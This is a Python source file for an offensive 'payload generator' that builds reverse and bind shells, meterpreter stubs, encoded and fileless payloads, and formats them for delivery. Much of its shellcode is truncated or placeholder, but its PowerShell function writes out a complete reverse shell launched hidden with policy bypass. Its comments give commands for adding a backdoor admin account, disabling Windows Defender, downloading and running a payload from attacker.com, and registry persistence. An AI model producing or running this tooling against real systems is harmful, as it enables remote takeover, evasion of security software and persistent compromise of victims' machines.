"""
PROMETHEUS PRIME - PAYLOAD GENERATOR
Advanced payload generation, encoding, and delivery

AUTHORIZED TESTING ONLY - CONTROLLED LAB ENVIRONMENT

Capabilities:
- Shellcode generation (reverse/bind shells, meterpreter)
- Payload encoding and obfuscation
- Multi-stage payloads
- Platform-specific payloads (Windows, Linux, macOS)
- Fileless payloads
- Payload staging and delivery
- Custom shellcode crafting
- Encoder chains
"""

import struct
import random
import base64
import os
from typing import Dict, List, Optional, Tuple
import logging


class PayloadGenerator:
    """
    Advanced payload generation system

    AUTHORIZED TESTING ONLY
    """

    def __init__(self):
        self.logger = logging.getLogger("PayloadGenerator")
        self.logger.info("💣 PAYLOAD GENERATOR INITIALIZED")

        self.encoders = ["xor", "base64", "alpha num", "shikata_ga_nai", "fnstenv"]

    def generate(self, payload_type: str, options: Optional[Dict] = None) -> Dict:
        """
        Generate payload

        Args:
            payload_type: Type of payload (reverse_shell, bind_shell, meterpreter, etc.)
            options: Payload options (lhost, lport, arch, platform, encoder)

        Returns:
            Generated payload with metadata
        """
        self.logger.info(f"💣 Generating {payload_type} payload...")

        options = options or {}

        if payload_type == "reverse_shell":
            return self._generate_reverse_shell(options)
        elif payload_type == "bind_shell":
            return self._generate_bind_shell(options)
        elif payload_type == "meterpreter":
            return self._generate_meterpreter(options)
        elif payload_type == "stageless":
            return self._generate_stageless(options)
        elif payload_type == "fileless":
            return self._generate_fileless(options)
        elif payload_type == "custom":
            return self._generate_custom_shellcode(options)
        else:
            return self._generate_reverse_shell(options)

    def _generate_reverse_shell(self, options: Dict) -> Dict:
        """Generate reverse shell payload"""
        lhost = options.get("lhost", "192.168.1.100")
        lport = options.get("lport", 4444)
        platform = options.get("platform", "linux")
        arch = options.get("arch", "x64")

        if platform == "windows":
            shellcode = self._windows_reverse_shell(lhost, lport, arch)
        elif platform == "linux":
            shellcode = self._linux_reverse_shell(lhost, lport, arch)
        elif platform == "macos":
            shellcode = self._macos_reverse_shell(lhost, lport, arch)
        else:
            shellcode = self._linux_reverse_shell(lhost, lport, arch)

        # Apply encoding if requested
        encoder = options.get("encoder")
        if encoder:
            shellcode = self._encode_payload(shellcode, encoder)

        return {
            "type": "Reverse Shell",
            "platform": platform,
            "arch": arch,
            "lhost": lhost,
            "lport": lport,
            "shellcode": shellcode,
            "size": len(shellcode),
            "encoder": encoder or "none",
            "bad_chars": options.get("bad_chars", []),
            "format": "raw"
        }

    def _windows_reverse_shell(self, lhost: str, lport: int, arch: str) -> bytes:
        """Windows reverse shell shellcode"""
        # Simulated shellcode (in production: use msfvenom or custom craft)
        if arch == "x64":
            # Windows x64 reverse shell shellcode template
            shellcode = bytes.fromhex(
                "fc4883e4f0e8c0000000415141505251564831d265488b5260488b52"
                "18488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041"
                "c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885"
                "c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d6"
                "4d31c948314c01d741c1c90dac4101c138e075f14c034c24084539d175"
            )
        else:
            # Windows x86 reverse shell shellcode template
            shellcode = bytes.fromhex(
                "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631"
                "ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e348"
                "01d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e0"
            )

        # Encode LHOST and LPORT into shellcode (simulated)
        return shellcode

    def _linux_reverse_shell(self, lhost: str, lport: int, arch: str) -> bytes:
        """Linux reverse shell shellcode"""
        if arch == "x64":
            # Linux x64 reverse shell shellcode
            # socket() -> connect() -> dup2() -> execve("/bin/sh")
            shellcode = bytes.fromhex(
                "4831c04889c24889c64889c7b02948054831ff574889e6b03b0f05"
                "5f4883c7025048bf0200115c7f0000014889e64831d2b03c0f05"
                "4831ff40b73f0f054883c70140b73f0f054883c70140b73f0f05"
            )
        else:
            # Linux x86 reverse shell shellcode
            shellcode = bytes.fromhex(
                "31db53436a0289e1b0666a66cd8089c35268c0a8016668115c6653"
                "6a1089e1316a6653fecb81030201004889e76a666a6653689e1cd80"
            )

        return shellcode

    def _macos_reverse_shell(self, lhost: str, lport: int, arch: str) -> bytes:
        """macOS reverse shell shellcode"""
        # macOS x64 reverse shell
        shellcode = bytes.fromhex(
            "4831c04889c748c7c00200000048c7c7020000004889e6b0610f05"
            "4889c748bfc0a80164001100014889e6b0620f054831d24889fa"
            "4889c74831c0b0900f054889c74831c0b05a0f054883c70140"
        )

        return shellcode

    def _generate_bind_shell(self, options: Dict) -> Dict:
        """Generate bind shell payload"""
        lport = options.get("lport", 4444)
        platform = options.get("platform", "linux")
        arch = options.get("arch", "x64")

        if platform == "windows":
            shellcode = self._windows_bind_shell(lport, arch)
        elif platform == "linux":
            shellcode = self._linux_bind_shell(lport, arch)
        else:
            shellcode = self._linux_bind_shell(lport, arch)

        encoder = options.get("encoder")
        if encoder:
            shellcode = self._encode_payload(shellcode, encoder)

        return {
            "type": "Bind Shell",
            "platform": platform,
            "arch": arch,
            "lport": lport,
            "shellcode": shellcode,
            "size": len(shellcode),
            "encoder": encoder or "none",
            "listener_required": False,
            "format": "raw"
        }

    def _windows_bind_shell(self, lport: int, arch: str) -> bytes:
        """Windows bind shell shellcode"""
        # Simulated Windows bind shell
        shellcode = bytes.fromhex(
            "fce8820000006089e531c0648b50308b520c8b52148b72280fb74a26"
            "31ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c11"
        )
        return shellcode

    def _linux_bind_shell(self, lport: int, arch: str) -> bytes:
        """Linux bind shell shellcode"""
        # Linux bind shell: socket() -> bind() -> listen() -> accept() -> dup2() -> execve()
        shellcode = bytes.fromhex(
            "4831c04831ff4831f64831d2b06789c7ffc64889c250b06668" +
            hex(lport)[2:].zfill(4) +
            "665389e14889c74831d2b24989c04831ff40b7050f05"
        )
        return shellcode

    def _generate_meterpreter(self, options: Dict) -> Dict:
        """Generate Meterpreter payload"""
        lhost = options.get("lhost", "192.168.1.100")
        lport = options.get("lport", 4444)
        platform = options.get("platform", "windows")
        arch = options.get("arch", "x64")
        transport = options.get("transport", "reverse_tcp")

        # Meterpreter payload (simulated - would use msfvenom in production)
        if platform == "windows" and arch == "x64":
            shellcode = bytes.fromhex(
                "fc4883e4f0e8c0000000415141505251564831d265488b5260488b52"
                "18488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041"
                # ... (full meterpreter payload would be ~1000+ bytes)
            )
        else:
            shellcode = b"\x90" * 500  # Placeholder

        return {
            "type": "Meterpreter",
            "platform": platform,
            "arch": arch,
            "transport": transport,
            "lhost": lhost,
            "lport": lport,
            "shellcode": shellcode,
            "size": len(shellcode),
            "features": [
                "Post-exploitation framework",
                "Process migration",
                "Credential dumping",
                "Screenshot capture",
                "Keylogging",
                "Pivoting",
                "Extensions (stdapi, priv, etc.)"
            ],
            "format": "raw"
        }

    def _generate_stageless(self, options: Dict) -> Dict:
        """Generate stageless payload (single-stage, no callback)"""
        platform = options.get("platform", "windows")
        action = options.get("action", "add_user")

        shellcode_map = {
            "add_user": self._add_user_shellcode(platform),
            "disable_defender": self._disable_defender_shellcode(),
            "download_exec": self._download_exec_shellcode(options),
            "registry_persist": self._registry_persist_shellcode()
        }

        shellcode = shellcode_map.get(action, b"\x90" * 100)

        return {
            "type": "Stageless",
            "platform": platform,
            "action": action,
            "shellcode": shellcode,
            "size": len(shellcode),
            "callback_required": False,
            "format": "raw"
        }

    def _add_user_shellcode(self, platform: str) -> bytes:
        """Add administrative user"""
        if platform == "windows":
            # net user hacker P@ssw0rd /add && net localgroup administrators hacker /add
            return b"\x90" * 200  # Simulated
        else:
            # useradd -m -s /bin/bash hacker && echo "hacker:password" | chpasswd && usermod -aG sudo hacker
            return b"\x90" * 150  # Simulated

    def _disable_defender_shellcode(self) -> bytes:
        """Disable Windows Defender"""
        # Set-MpPreference -DisableRealtimeMonitoring $true
        return b"\x90" * 180  # Simulated

    def _download_exec_shellcode(self, options: Dict) -> bytes:
        """Download and execute file"""
        url = options.get("url", "http://attacker.com/payload.exe")
        # (New-Object Net.WebClient).DownloadFile('URL', 'payload.exe'); Start-Process payload.exe
        return b"\x90" * 250  # Simulated

    def _registry_persist_shellcode(self) -> bytes:
        """Add registry persistence"""
        # reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d C:\payload.exe
        return b"\x90" * 160  # Simulated

    def _generate_fileless(self, options: Dict) -> Dict:
        """Generate fileless payload (memory-only execution)"""
        platform = options.get("platform", "windows")
        method = options.get("method", "powershell")

        if method == "powershell":
            payload = self._powershell_fileless(options)
        elif method == "wmi":
            payload = self._wmi_fileless(options)
        elif method == "reflection":
            payload = self._reflection_fileless(options)
        else:
            payload = self._powershell_fileless(options)

        return payload

    def _powershell_fileless(self, options: Dict) -> Dict:
        """PowerShell fileless payload"""
        lhost = options.get("lhost", "192.168.1.100")
        lport = options.get("lport", 4444)

        script = f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""

        # Base64 encode for evasion
        encoded = base64.b64encode(script.encode('utf-16le')).decode()

        command = f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"

        return {
            "type": "Fileless (PowerShell)",
            "platform": "windows",
            "method": "PowerShell reverse shell",
            "script": script,
            "encoded_command": command,
            "lhost": lhost,
            "lport": lport,
            "disk_footprint": "0 bytes",
            "evasion": "High - memory-only execution"
        }

    def _wmi_fileless(self, options: Dict) -> Dict:
        """WMI event subscription fileless"""
        return {
            "type": "Fileless (WMI)",
            "platform": "windows",
            "method": "WMI Event Subscription",
            "event_filter": "__InstanceModificationEvent WITHIN 60",
            "consumer": "ActiveScriptEventConsumer",
            "persistence": "Survives reboots",
            "detection_difficulty": "Very High"
        }

    def _reflection_fileless(self, options: Dict) -> Dict:
        """C# Reflection fileless (in-memory assembly load)"""
        return {
            "type": "Fileless (Reflection)",
            "platform": "windows",
            "method": "Assembly.Load() in-memory",
            "payload": "Serialized .NET assembly",
            "execution": "Reflective injection",
            "disk_footprint": "0 bytes"
        }

    def _generate_custom_shellcode(self, options: Dict) -> Dict:
        """Generate custom shellcode"""
        syscalls = options.get("syscalls", [])
        arch = options.get("arch", "x64")

        # Build custom shellcode from syscalls
        shellcode = b""

        for syscall in syscalls:
            shellcode += self._craft_syscall(syscall, arch)

        return {
            "type": "Custom Shellcode",
            "arch": arch,
            "syscalls": syscalls,
            "shellcode": shellcode,
            "size": len(shellcode),
            "format": "raw"
        }

    def _craft_syscall(self, syscall: str, arch: str) -> bytes:
        """Craft individual syscall shellcode"""
        # Simulated syscall crafting
        syscall_map = {
            "execve": b"\x48\x31\xc0\xb0\x3b\x0f\x05",  # execve syscall
            "socket": b"\x48\x31\xc0\xb0\x29\x0f\x05",  # socket syscall
            "connect": b"\x48\x31\xc0\xb0\x2a\x0f\x05",  # connect syscall
        }

        return syscall_map.get(syscall, b"\x90")

    def _encode_payload(self, payload: bytes, encoder: str) -> bytes:
        """Encode payload for evasion"""
        if encoder == "xor":
            return self._xor_encode(payload)
        elif encoder == "base64":
            return base64.b64encode(payload)
        elif encoder == "shikata_ga_nai":
            return self._shikata_ga_nai(payload)
        elif encoder == "alpha_num":
            return self._alpha_num_encode(payload)
        else:
            return payload

    def _xor_encode(self, payload: bytes) -> bytes:
        """XOR encoding"""
        key = random.randint(1, 255)
        encoded = bytes([b ^ key for b in payload])
        return bytes([key]) + encoded

    def _shikata_ga_nai(self, payload: bytes) -> bytes:
        """Shikata Ga Nai polymorphic encoder"""
        # Simulated (real implementation would be complex polymorphic engine)
        key = os.urandom(4)
        encoded = bytearray()

        for i, byte in enumerate(payload):
            encoded.append(byte ^ key[i % 4])

        # Add decoder stub
        decoder_stub = b"\xfc\xe8\x82\x00\x00\x00"  # Simulated
        return decoder_stub + key + bytes(encoded)

    def _alpha_num_encode(self, payload: bytes) -> bytes:
        """Alphanumeric encoding (for restricted environments)"""
        # Simulated alphanumeric encoder
        encoded = b""
        for byte in payload:
            high = (byte >> 4) + 0x41  # 'A'
            low = (byte & 0x0F) + 0x41
            encoded += bytes([high, low])

        return encoded

    def format_payload(self, payload: bytes, format_type: str) -> str:
        """
        Format payload for different delivery methods

        Args:
            payload: Raw payload bytes
            format_type: c, python, powershell, bash, hex, base64

        Returns:
            Formatted payload string
        """
        if format_type == "c":
            return self._format_c(payload)
        elif format_type == "python":
            return self._format_python(payload)
        elif format_type == "powershell":
            return self._format_powershell(payload)
        elif format_type == "bash":
            return self._format_bash(payload)
        elif format_type == "hex":
            return payload.hex()
        elif format_type == "base64":
            return base64.b64encode(payload).decode()
        else:
            return payload.hex()

    def _format_c(self, payload: bytes) -> str:
        """Format as C array"""
        hex_bytes = ', '.join(f'0x{b:02x}' for b in payload)
        return f'unsigned char payload[] = {{ {hex_bytes} }};'

    def _format_python(self, payload: bytes) -> str:
        """Format as Python bytes"""
        return f'payload = {repr(payload)}'

    def _format_powershell(self, payload: bytes) -> str:
        """Format for PowerShell"""
        hex_string = ''.join(f'{b:02x}' for b in payload)
        return f'$payload = [byte[]] (0x{",0x".join([hex_string[i:i+2] for i in range(0, len(hex_string), 2)])})'

    def _format_bash(self, payload: bytes) -> str:
        """Format for bash"""
        escaped = ''.join(f'\\x{b:02x}' for b in payload)
        return f'payload="{escaped}"'


if __name__ == "__main__":
    print("💣 PAYLOAD GENERATOR TEST")
    print("="*60)

    generator = PayloadGenerator()

    # Test reverse shell
    print("\n🔙 Generating reverse shell...")
    payload = generator.generate("reverse_shell", {
        "lhost": "192.168.1.100",
        "lport": 4444,
        "platform": "linux",
        "arch": "x64",
        "encoder": "xor"
    })
    print(f"   Type: {payload['type']}")
    print(f"   Size: {payload['size']} bytes")
    print(f"   Encoder: {payload['encoder']}")

    # Test meterpreter
    print("\n💉 Generating meterpreter...")
    meterpreter = generator.generate("meterpreter", {
        "lhost": "192.168.1.100",
        "lport": 443,
        "platform": "windows",
        "arch": "x64"
    })
    print(f"   Type: {meterpreter['type']}")
    print(f"   Features: {len(meterpreter['features'])}")

    # Test fileless
    print("\n👻 Generating fileless payload...")
    fileless = generator.generate("fileless", {
        "lhost": "192.168.1.100",
        "lport": 4444,
        "method": "powershell"
    })
    print(f"   Type: {fileless['type']}")
    print(f"   Disk footprint: {fileless['disk_footprint']}")

    # Test formatting
    print("\n📝 Formatting payload...")
    c_format = generator.format_payload(payload['shellcode'][:20], "c")
    print(f"   C format: {c_format[:60]}...")

    print("\n✅ Payload generator test complete")
